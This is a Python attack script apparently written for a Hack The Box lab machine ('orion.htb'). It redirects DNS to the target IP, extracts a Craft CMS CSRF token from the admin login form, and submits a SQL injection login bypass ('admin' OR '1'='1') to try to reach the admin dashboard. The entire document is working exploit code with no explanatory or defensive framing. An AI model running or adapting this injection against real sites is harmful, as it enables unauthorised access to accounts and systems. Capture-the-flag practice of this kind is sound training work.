#!/usr/bin/env python3
import requests
import socket
import urllib3

urllib3.disable_warnings()

TARGET_IP = "10.129.244.146"
_orig = socket.getaddrinfo
def p(h, *a, **kw):
    return _orig("10.129.244.146" if h == "orion.htb" else h, *a, **kw)
socket.getaddrinfo = p

s = requests.Session()
s.verify = False

# Get login form to extract CSRF token
r = s.get("http://orion.htb/admin/login")
import re
csrf_match = re.search(r'name="CRAFT_CSRF_TOKEN"\s+value="([^"]+)"', r.text)
if csrf_match:
    csrf = csrf_match.group(1)
    print(f"[+] CSRF from login form: {csrf[:30]}")

    # Try SQL injection
    payload = {
        "loginName": "admin' OR '1'='1",
        "password": "anything",
        "CRAFT_CSRF_TOKEN": csrf
    }

    r2 = s.post("http://orion.htb/admin/login", data=payload, allow_redirects=False)
    print(f"[+] SQL Injection response: {r2.status_code}")
    print(f"[+] Location: {r2.headers.get('Location', 'none')}")

    if "dashboard" in r2.text.lower():
        print("[!] Possible SQL injection success!")
        print(r2.text[:500])
else:
    print("[-] Could not find CSRF token in login form")
